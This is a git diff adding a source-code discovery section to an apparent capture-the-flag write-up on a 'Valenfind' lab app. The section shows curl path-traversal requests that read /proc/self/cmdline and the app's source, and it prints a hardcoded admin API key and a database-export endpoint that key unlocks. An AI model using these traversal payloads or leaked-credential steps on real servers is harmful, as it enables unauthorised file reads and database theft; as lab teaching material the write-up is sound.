@@ -44,6 +44,72 @@ The response returned the contents of `/etc/passwd`, confirming that the endpoin
 
 <img width="933" height="862" alt="image" src="https://github.com/user-attachments/assets/cc0955c8-4b16-4622-bc4e-cc515641f5c0" />
 
+## Source Code Discovery
+
+After confirming the Local File Inclusion vulnerability, my next objective was to locate the application's source code on the server.
+
+A useful Linux technique for this is reading `/proc/self/cmdline`. The `/proc` filesystem exposes information about running processes, and `/proc/self` refers to the current process handling the request. The `cmdline` file contains the exact command used to start that process.
+
+I used the following request to read it:
+
+```bash
+$ curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../proc/self/cmdline -O 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    39  100    39    0     0    598      0 --:--:-- --:--:-- --:--:--   600
+death@esther:~$ cat fetch_layout 
+/usr/bin/python3/opt/Valenfind/app.py
+```
+
+The same request can also be performed through Burp Suite if preferred.
+
+<img width="1222" height="277" alt="image" src="https://github.com/user-attachments/assets/78751324-cd19-4c61-b504-feff06f16f9c" />
+
+The response revealed the full path of the application entry point, giving me a precise target to read next.
+
+The application was located at:
+
+```
+/opt/Valenfind/app.py
+```
+
+I then requested the file directly through the vulnerable endpoint:
+
+```bash
+curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
+```
+
+<img width="1086" height="562" alt="image" src="https://github.com/user-attachments/assets/ddbb9ed6-1c5b-4c1a-ac9a-41103fba7eb7" />
+
+<img width="1521" height="530" alt="image" src="https://github.com/user-attachments/assets/a1efa4d3-7acd-416a-93bb-599a7dacc48b" />
+
+The server returned the complete Python source code. While reviewing it, I found two particularly interesting hardcoded values near the beginning of the file:
+
+```python
+ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+DATABASE      = 'cupid.db'
+```
+
+Further down in the source code, I found an administrative endpoint responsible for exporting the application's database:
+
+```python
+@app.route('/api/admin/export_db')
+def export_db():
+    auth_header = request.headers.get('X-Valentine-Token')
+    if auth_header == ADMIN_API_KEY:
+        try:
+            return send_file(DATABASE, as_attachment=True,
+                             download_name='valenfind_leak.db')
+        except Exception as e:
+            return str(e)
+    else:
+        return jsonify({"error": "Forbidden",
+                        "message": "Missing or Invalid Admin Token"}), 403
+```
+
+<img width="974" height="267" alt="image" src="https://github.com/user-attachments/assets/ad7225f9-dae5-437a-9aab-c79bcb25a74b" />
+
+
 ---------------------
 
 Use /proc/self/cmdline to Find the App's Location
@@ -96,6 +162,9 @@ def export_db():
                         "message": "Missing or Invalid Admin Token"}), 403
 ```
 <img width="974" height="267" alt="image" src="https://github.com/user-attachments/assets/ad7225f9-dae5-437a-9aab-c79bcb25a74b" />
+
+
+--------------
 
 There’s an endpoint at /api/admin/export_db that downloads the entire database — but only if you send the correct X-Valentine-Token header. You now have exactly that token.
 
